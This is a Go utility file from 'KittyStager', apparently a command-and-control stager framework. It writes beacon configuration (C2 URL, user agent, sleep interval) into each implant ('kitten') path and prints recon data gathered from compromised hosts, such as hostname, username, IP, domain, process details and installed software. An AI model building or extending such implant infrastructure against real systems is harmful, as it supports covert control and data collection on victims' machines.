package util

import (
	"KittyStager/cmd/config"
	"encoding/json"
	"fmt"
	color "github.com/logrusorgru/aurora"
	"io/ioutil"
)

// GenerateConfig generate the config file for all the kitten
func GenerateConfig(conf config.General) error {
	data := fmt.Sprintf("http://%s:%d%s,%s,%d", conf.GetHost(), conf.GetPort(), conf.GetEndpoint(), conf.GetUserAgent(), conf.GetSleep())
	for x := range conf.GetMalPath() {
		err := ioutil.WriteFile(conf.GetMalPathWithId(x)+"conf.txt", []byte(data), 0644)
		if err != nil {
			return err
		}
		fmt.Printf("%s %s\n", color.Green("[+] Generated conf file for"), color.Yellow(conf.GetMalPathWithId(x)))
	}
	return nil
}

// ErrPrint print the error
func ErrPrint(err error) {
	if err != nil {
		fmt.Printf("\n%s %s\n", color.Red("[-]"), color.Red(err.Error()))
	}
}

// UnmarshalJSON unmarshal the json
func UnmarshalJSON(j []byte) (InitialChecks, error) {
	var iniCheck InitialChecks
	err := json.Unmarshal(j, &iniCheck)
	if err != nil {
		return InitialChecks{}, err
	}
	return iniCheck, nil
}

func PrintCookie(cookie []byte) error {
	j, err := UnmarshalJSON(cookie)
	if err != nil {
		return err
	}
	fmt.Printf("%s %s\n", color.Green("[+] hostname:"), color.Yellow(j.GetHostname()))
	fmt.Printf("%s %s\n", color.Green("[+] Username:"), color.Yellow(j.GetUsername()))
	fmt.Printf("%s %s\n", color.Green("[+] IP:"), color.Yellow(j.GetIp()))
	fmt.Print(color.Green("[+] To get more, use the recon command\n"))
	return nil
}

func PrintRecon(i InitialChecks) {
	fmt.Printf("\n%s %s\n", color.Green("[+] Kitten name:"), color.Yellow(i.GetKittenName()))
	fmt.Printf("%s %s\n", color.Green("[+] hostname:"), color.Yellow(i.GetHostname()))
	fmt.Printf("%s %s\n", color.Green("[+] Username:"), color.Yellow(i.GetUsername()))
	fmt.Printf("%s %s\n", color.Green("[+] IP:"), color.Yellow(i.GetIp()))
	fmt.Printf("%s %s\n", color.Green("[+] Domain:"), color.Yellow(i.GetDomain()))
	fmt.Printf("%s %s\n", color.Green("[+] Process:"), color.Yellow(i.GetPName()))
	fmt.Printf("%s %s\n", color.Green("[+] Process path:"), color.Yellow(i.GetPath()))
	fmt.Printf("%s %s\n", color.Green("[+] Process pid:"), color.Yellow(fmt.Sprintf("%d", i.GetPid())))
	fmt.Print(color.Green("[+] Installed software : \n"))
	f := i.GetDir()
	s, _ := json.MarshalIndent(f, "", "\t")
	fmt.Printf("%s\n", color.Yellow(string(s)))
}
